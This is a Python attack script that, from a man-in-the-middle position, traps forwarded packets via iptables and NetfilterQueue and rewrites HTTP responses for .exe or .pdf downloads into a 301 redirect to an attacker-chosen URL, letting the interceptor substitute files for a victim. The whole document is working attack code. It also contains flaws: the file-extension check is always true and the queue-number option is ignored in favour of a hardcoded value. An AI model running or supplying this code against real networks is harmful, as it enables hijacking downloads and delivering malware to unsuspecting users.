#!/usr/bin/env python3

import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from argparse import ArgumentParser
import subprocess
import sys

if sys.version_info < (3, 0):
    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
    sys.stderr.write("Please update and make sure you use the command python3 file_intercept.py --queue-num <num>\n\n")
    sys.exit(0)

ack_list = []


def args():
    parser = ArgumentParser()
    parser.add_argument("-q", "--queue-num", dest="queue_num", help="Specify the queue number to trap the sniffed "
                                                                    "packets. Example: --queue-num 7")
    options = parser.parse_args()
    if not options.queue_num:
        parser.error("[-] Please specify the queue number to trap the sniffed packets., or type it correctly, "
                     "ex: --queue-num 7")
    return options


def set_load(packet, load):
    packet[scapy.TCP].load = load  # add the url you want to redirect the target to
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    # print(packet.get_payload())  # all the packets that flow to our machine, it will get trapped in the queue that we
    # create, that's will not forward the packets to the target machine
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:  # check for destination http request
            print("[+] HTTP Request")
            if ".exe" or ".pdf" in scapy_packet[scapy.Raw].load:  # check if victim request any files contains .exe
                # or .pdf extensions
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:  # check for destination http response
            print("[+] HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File..")
                modified_packet = set_load(packet=scapy_packet, load="HTTP/1.1 301 Moved Permanently\nLocation: "
                                                                     "https://www.example.org/index.asp\n\n")

                packet.set_payload(bytes(modified_packet))  # this will set our new modified rules
    packet.accept()  # this will forward the trapped packets
    # packet.drop()  # this drop the trapped packets and cut the internet connection from the target


try:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num " + args().queue_num, shell=True)  # adding rules to
    # trap the packets
    print("[+] Script is running...")
    queue = NetfilterQueue()
    queue.bind(queue_num=7, user_callback=process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Detected 'ctrl + c' pressed, program terminated.")
    print("[*] flushing iptables rules...\n")
    subprocess.call(["iptables", "--flush"])  # remove the rules by flushing iptables
